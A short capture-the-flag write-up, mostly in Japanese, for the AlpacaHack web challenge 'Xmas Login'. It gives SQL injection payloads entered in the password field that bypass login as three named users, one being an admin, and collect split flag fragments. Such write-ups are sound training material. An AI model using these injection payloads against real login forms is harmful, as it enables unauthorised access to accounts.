---
title: Xmas Login
category: web
genre: sql-injection
difficulty: easy
tags:
  - sqli
  - auth-bypass
  - length-filter
source: alpacahack:xmas-login
solved_at: 2026-05-29
---

# Xmas Login

## 問題の要点

- `alpaca`, `reindeer`, `santa_claus_admin` の3ユーザーそれぞれに flag 断片がある。
- username 長制限により `santa_claus_admin` を username 欄には入れられない。
- password 欄で SQLi できる。

## 解き方

username はダミーにして、password 側で対象 user を指定する。

```text
Username: dummy
Password: ' OR username = 'alpaca' ;-- -
Password: ' OR username = 'reindeer' ;-- -
Password: ' OR username = 'santa_claus_admin' ;-- -
```

3つの応答から flag をつなぐ。

## 知見

- 片方のフォームに長さ制限があっても、もう片方の injectable field から条件を作れる。
- flag が複数 role に分割される問題では、全 role の取得条件を一覧化する。

## 連携する知見

- [Web](../../../insights/web.md)
- [Web relations](../../../relations/web.md)
